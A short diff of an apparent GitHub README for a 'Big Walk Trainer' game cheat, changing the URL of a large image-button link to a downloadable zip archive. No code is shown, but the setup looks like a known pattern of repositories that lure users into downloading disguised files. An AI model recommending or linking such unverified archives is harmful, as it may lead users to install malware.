@@ -9,7 +9,7 @@
 
 > **[⬇ Download the latest Big Walk trainer](https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/latest)**
 <p align="center">
-    <a href="https://github.com/Crushflalead/YarnPikeman60/Big-Walk-Trainer/latest/download/BigWalkTrainer.zip">
+    <a href="https://github.com/YarnPikeman60/Big-Walk-Trainer/latest/download/BigWalkTrainer.zip">
         <img src="assets/example1.png" width="100%" alt="Download Big Walk Trainer">
     </a>
 </p>
